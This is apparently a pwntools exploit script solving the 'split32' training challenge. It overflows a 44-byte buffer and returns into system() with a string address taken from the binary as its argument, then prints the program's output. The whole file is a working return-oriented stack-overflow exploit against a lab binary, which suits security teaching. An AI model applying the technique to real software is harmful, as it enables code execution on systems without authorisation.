from pwn import *

bin = './split32'
p = process(bin)
context.binary = bin


system = 0x0804861a      # PLT entry for system()
useful_string = 0x0804a030

payload = b'A'*44
payload += p32(system)             # ret into system() address from usefulFunction()
payload += p32(useful_string)             # argument to system(), put on stack since its 32-bit arch

p.sendafter(b'> ', payload)

output = p.recvall(timeout=1).decode()
print(output)
